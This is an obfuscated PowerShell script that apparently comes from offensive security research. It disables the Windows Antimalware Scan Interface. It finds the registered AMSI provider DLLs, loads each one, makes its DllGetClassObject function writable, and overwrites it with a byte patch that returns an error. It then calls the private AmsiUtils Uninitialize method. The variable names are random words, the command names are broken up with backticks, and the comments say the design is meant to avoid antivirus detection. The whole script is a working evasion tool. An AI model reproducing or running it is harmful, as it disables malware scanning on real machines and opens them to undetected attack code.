# Write-Host "AMSI providers' initialization interception"
# Write-Host "-- Maor Korkos (@maorkor)"

# Call Windows APIs with reflection (crediton reflection: http://redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
# Add-Type causes the code to be written to a temporary file on the disk, then csc.exe is used to compile this code into a binary
# Artifacts on disk may cause AV detection, solution - reflection

# Providers registry enumeration implemented by: https://github.com/R-Secure/AMSI-Bypasses

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $MistyHarsh,
        [Parameter(Position = 1, Mandatory = $True)] [String] $SnatchStar
    )

    # Get a reference to System.dll in the GAC
    $BurstThroat = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $PenMatch = $BurstThroat.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $LaunchChance = $PenMatch.GetMethod('GetModuleHandle')
    $SpoonFuture = $PenMatch.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $JarQuill = $LaunchChance.Invoke($null, @($MistyHarsh))
    $ExistCover = ne`w`-`ob`je`ct IntPtr
    $SaltMind = ne`w`-`ob`je`ct System.Runtime.InteropServices.HandleRef($ExistCover, $JarQuill)
    # Return the address of the function
    return $SpoonFuture.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$SaltMind, $SnatchStar))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $FoodShaky = (ne`w`-`ob`je`ct Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $SharpRelax = [Void]
    )

    $RapidNight = [AppDomain]::CurrentDomain
    $CutMagic = ne`w`-`ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')
    $TiredTie = $RapidNight.DefineDynamicAssembly($CutMagic, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $VastFuture = $TiredTie.DefineDynamicModule('InMemoryModule', $false)
    $ExpandLowly = $VastFuture.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $BikePizzas = $ExpandLowly.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $FoodShaky)
    $BikePizzas.SetImplementationFlags('Runtime, Managed')
    $FixedDeer = $ExpandLowly.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $SharpRelax, $FoodShaky)
    $FixedDeer.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $ExpandLowly.CreateType()
}
$DustyQuiet = Get-ProcAddress kernel32.dll LoadLibraryA
$SaveDecide = Get-DelegateType @([String]) ([IntPtr])
$MilkSlimy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DustyQuiet,
$SaveDecide)
$FarAdd = Get-ProcAddress kernel32.dll GetProcAddress
$CooingWail = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$SpoonFuture = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FarAdd,
$CooingWail)
$ErectName = Get-ProcAddress kernel32.dll VirtualProtect
$PackEight = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$PreferMice = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ErectName,
$PackEight)

$BeliefUnable = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$MaskBooks = 0

foreach ($PreachCycle in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $GroundBoat = 'HKLM:\Software\Classes\CLSID\' + $PreachCycle + '\InprocServer32'
    $SameGrass = Get-ItemPropertyValue -Name '(Default)' $GroundBoat -ErrorAction SilentlyContinue
    if ($SameGrass)
    {
        $YellBee = Split-Path $SameGrass -leaf
        $NeedleSad = $YellBee -replace '"', ""
        $TableGroup = $MilkSlimy.Invoke($NeedleSad) 
        if ($TableGroup -ne 0)
        {
            Write-host "[*] Provider found - " $YellBee
            $FarPlanes = $SpoonFuture.Invoke($TableGroup, "DllGetClassObject")        
            $PreferMice.Invoke($FarPlanes, [uint32]$BeliefUnable.Length, 0x40, [ref]$MaskBooks)
            [System.Runtime.InteropServices.Marshal]::Copy($BeliefUnable, 0, $FarPlanes, $BeliefUnable.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$FarTacit = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$FarTacit.Invoke($object,$null)
